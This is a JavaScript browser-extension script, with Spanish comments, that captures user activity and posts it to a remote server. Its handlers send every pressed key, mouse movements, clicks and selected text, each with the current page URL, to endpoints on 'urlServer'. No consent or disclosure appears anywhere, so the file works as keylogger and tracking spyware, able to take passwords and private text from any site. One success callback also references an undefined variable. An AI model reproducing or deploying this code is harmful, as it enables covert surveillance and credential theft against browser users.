/* Variable que almacena un mapa de:

	mensaje recibido de algun tipo de accion: funcion que maneja ese mensaje
	según el tipo de accion capturada que representa.

*/ 
var messagesActionsMap = {
	'newTab': function(message, sender){
		//Implementar logica!!!
	},
	'keystroke': function(message, sender){
		sendAjaxRequest({
			method: 'POST',
			url: urlServer+'keystrokes',
			headers: {
				'Content-Type': 'application/json;charset=UTF-8'
			},
			data: {
				browser : browserName,
				pageUrl: sender.tab.url,
				keyValue: message.pressedKey,
				captureTimestamp: message.captureTimestamp 
			}
		},function(success){
			console.log(sucess.response);
		}, function(error){
			console.log(error.response);
		});
	},
	'mouseMove': function(message, sender){
		sendAjaxRequest({
			method: 'POST',
			url: urlServer+'mouseMoves',
			headers: {
				'Content-Type': 'application/json;charset=UTF-8'
			},
			data: {
				browser: browserName,
				pageUrl: sender.tab.url,
				xPage: message.xPage,
				yPage: message.yPage,
				xClient: message.xClient,
				yClient: message.yClient,
				xScreen: message.xScreen,
				yScreen: message.yScreen,
				xMovement: message.xMovement,
				yMovement: message.yMovement,
				captureTimestamp: message.captureTimestamp
			}
		}, function(sucess){
			console.log(sucess.response);
		}, function(error){
			console.log(error.response);
		});
	},
	'mouseClick': function(message, sender){
		sendAjaxRequest({
			method: 'POST',
			url: urlServer+'mouseClicks',
			headers: {
				'Content-Type': 'application/json;charset=UTF-8'
			},
			data: {
				browser: browserName,
				pageUrl: sender.tab.url,
				xPage: message.xPage,
				yPage: message.yPage,
				xClient: message.xClient,
				yClient: message.yClient,
				xScreen: message.xScreen,
				yScreen: message.yScreen,
				xMovement: message.xMovement,
				yMovement: message.yMovement,
				captureTimestamp: message.captureTimestamp
			}
		}, function(sucess){
			console.log(sucess.response);
		}, function(error){
			console.log(error.response);
		});
	},
	'mouseUp': function(message, sender){
		sendAjaxRequest({
			method: 'POST',
			url: urlServer+'mouseUps',
			headers:{
				'Content-Type': 'application/json;charset=UTF-8'
			},
			data:{
				browser: browserName,
				pageUrl: sender.tab.url,
				selectedText: message.selectedText
			}
		}, function(sucess){
			console.log(sucess.response);
		}, function(error){
			console.log(error.response);
		});
	}
};